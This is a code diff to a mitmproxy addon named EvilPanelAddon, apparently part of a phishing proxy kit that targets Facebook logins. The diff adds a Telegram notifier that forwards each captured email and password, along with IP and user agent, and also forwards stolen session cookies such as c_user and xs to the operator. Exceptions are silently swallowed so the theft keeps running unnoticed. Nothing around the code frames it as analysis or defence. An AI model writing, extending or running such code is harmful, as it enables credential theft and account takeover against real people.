@@ -15,6 +15,7 @@ from datetime import datetime
 from mitmproxy import http, ctx
 from urllib.parse import urlparse, parse_qs, urlencode, unquote
 from facebook_session_addon import FacebookSessionAddon
+from telegram_notifier import notifier
 
 # ========== CONFIG ==========
 DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "NEWDOMAIN_PLACEHOLDER")
@@ -392,6 +393,11 @@ class EvilPanelAddon:
                 )
                 conn.commit()
                 conn.close()
+
+                try:
+                    notifier.notify_credential(email=email, password=password, ip=ip, ua=ua, ts=record["timestamp"])
+                except Exception:
+                    pass
         except Exception as e:
             ctx.log.error(f"[CRED] Error: {e}")
 
@@ -451,6 +457,7 @@ class EvilPanelAddon:
 
         if all(k in captured for k in critical):
             ip = flow.metadata.get("target_ip", "")
+            ua = flow.request.headers.get("User-Agent", "")
 
             ctx.log.info(f"[SESSION] ✅ c_user={captured['c_user']} xs={captured['xs'][:18]}...")
 
@@ -483,6 +490,11 @@ class EvilPanelAddon:
                 conn.close()
             except Exception as e:
                 ctx.log.error(f"[SESSION] DB Error: {e}")
+
+            try:
+                notifier.notify_session(tokens=captured, ip=ip, ua=ua, ts=record["timestamp"])
+            except Exception:
+                pass
 
     def _rewrite_cookies(self, flow):
         cookies = flow.response.headers.get_all("Set-Cookie")
